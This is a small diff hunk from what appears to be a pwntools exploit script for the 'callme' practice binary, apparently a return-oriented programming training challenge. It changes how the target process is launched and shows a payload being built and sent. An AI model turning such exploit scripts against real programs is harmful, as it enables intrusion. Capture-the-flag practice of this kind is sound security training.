@@ -21,7 +21,7 @@ payload += callmeThree
 
 
 
-io = process("./callme")
+io = e.process()
 
 
 io.sendline(payload)
